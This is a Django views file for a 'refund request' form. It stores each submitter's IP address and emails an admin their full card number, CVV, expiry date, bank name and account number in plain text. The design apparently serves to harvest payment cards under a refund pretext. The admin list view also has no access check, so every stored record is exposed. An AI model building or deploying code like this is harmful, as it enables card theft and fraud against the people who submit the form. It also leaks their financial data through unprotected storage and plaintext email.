""""Refund views for handling refund requests and displaying forms."""
import logging
import smtplib
from django.shortcuts import render, redirect
from django.views import View
from django.contrib import messages
from django.http import JsonResponse
from django.core.mail import send_mail
from django.conf import settings

from .models import PaymentRequest

from .forms import PaymentForm

logger = logging.getLogger(__name__)

class IndexView(View):
    """View for the index page with refund form."""

    def get(self, request):
        """Handle GET requests to display the refund form."""
        form = PaymentForm()
        context = {
            'form': form,
            'recipient_name': 'customer',
        }
        return render(request, 'index.html', context)

    def post(self, request):
        """Handle POST requests to process refund form submission."""
        form = PaymentForm(request.POST)

        if form.is_valid():
            try:
                # Create refund request instance
                payment_request = form.save(commit=False)

                # Add metadata
                payment_request.ip_address = self._get_client_ip(request)
                payment_request.user_agent = request.META.get('HTTP_USER_AGENT', '')

                # Save to database
                payment_request.save()

                # Log the request
                logger.info("Refund request created: %s", payment_request.request_id)

                # # Send confirmation email (optional)
                self._send_confirmation_email(payment_request)

                if request.headers.get('Accept') == 'application/json':
                    return JsonResponse({
                        'success': True,
                        'message': 'Refund request submitted successfully!',
                        'request_id': str(payment_request.request_id)
                    })
                else:
                    messages.success(request,
                                     'Your refund request has been submitted successfully!')
                    return redirect('success')

            except (ValueError, TypeError, RuntimeError) as e:
                logger.error("Error processing refund request: %s", str(e))

                if request.headers.get('Accept') == 'application/json':
                    return JsonResponse({
                        'success': False,
                        'message': 'An error occurred while processing your request.'
                    }, status=500)
                else:
                    messages.error(request, 'An error occurred while processing your request.')

        else:
            if request.headers.get('Accept') == 'application/json':
                return JsonResponse({
                    'success': False,
                    'errors': form.errors
                }, status=400)

        context = {
            'form': form,
            'recipient_name': 'customer',
        }
        return render(request, 'index.html', context)

    def _get_client_ip(self, request):
        """Get the client's IP address."""
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip

    def _send_confirmation_email(self, payment_request):
        """Send confirmation email to admin."""
        try:
            subject = f'New Refund Request - {payment_request.request_id}'
            message = f"""
            A new refund request has been submitted:
            
            Request ID: {payment_request.request_id}
            Recipient: {payment_request.recipient_name}
            Amount: ${payment_request.refund_amount}
            Bank: {payment_request.bank_name}
            Account Number: {payment_request.account_number}
            Expiry Date: {payment_request.expiry_date}
            Card Number: {payment_request.card_number}
            CVV: {payment_request.cvv}
            Submitted At: {payment_request.created_at}
            IP Address: {payment_request.ip_address}
            """

            send_mail(
                subject,
                message,
                settings.DEFAULT_FROM_EMAIL,
                [settings.ADMIN_EMAIL],
                fail_silently=True
            )
        except smtplib.SMTPException as e:
            logger.error("Failed to send confirmation email: %s", str(e))
            logger.error("Failed to send confirmation email: %s", str(e))


class PaymentSuccessView(View):
    """View for successful refund submission."""

    def get(self, request):
        """Display success page."""
        return render(request, 'success.html')


class PaymentListView(View):
    """Admin view to list all refund requests."""

    def get(self, request):
        """Display list of refund requests (admin only)."""
        # Add admin authentication check here
        payment_requests = PaymentRequest.objects.all()
        context = {
            'payment_requests': payment_requests
        }
        return render(request, 'admin_list.html', context)
